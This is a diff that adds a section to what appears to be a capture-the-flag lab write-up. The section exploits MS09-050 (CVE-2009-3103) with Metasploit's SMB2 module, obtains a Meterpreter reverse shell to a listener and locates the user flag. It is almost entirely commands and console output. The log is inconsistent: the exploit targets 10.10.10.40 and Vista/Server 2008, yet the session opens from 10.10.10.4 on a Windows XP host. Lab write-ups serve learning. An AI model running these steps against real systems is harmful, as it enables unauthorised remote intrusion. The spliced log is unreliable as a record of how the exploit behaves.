@@ -114,3 +114,64 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 156.23 seconds
 ```
 
+CVE-2009-3103 refers to MS09-050. Get candidates from the msfconsole:
+```
+msf5 > search MS09-050
+
+Matching Modules
+================
+
+   #  Name                                                       Disclosure Date  Rank    Check  Description
+   -  ----                                                       ---------------  ----    -----  -----------
+   0  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                   normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   1  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                      normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
+   2  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+
+
+msf5 > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options
+
+Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   445              yes       The target port (TCP)
+   WAIT    180              yes       The number of seconds to wait for the attack to complete.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Vista SP1/SP2 and Server 2008 (x86)
+
+
+msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS 10.10.10.40
+RHOSTS => 10.10.10.40
+
+msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run
+
+[*] Started reverse TCP handler on 10.10.14.32:4444 
+[*] 10.10.10.40:445 - Connecting to the target (10.10.10.40:445)...
+[*] 10.10.10.40:445 - Sending the exploit packet (938 bytes)...
+[*] 10.10.10.40:445 - Waiting up to 180 seconds for exploit to trigger...
+[*] Sending stage (176195 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.32:4444 -> 10.10.10.4:1065) at 2020-08-26 17:35:20 -0400
+
+meterpreter > sysinfo
+Computer        : LEGACY
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > 
+meterpreter > search -f user.txt
+Found 1 result...
+    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
+
+```
+
+
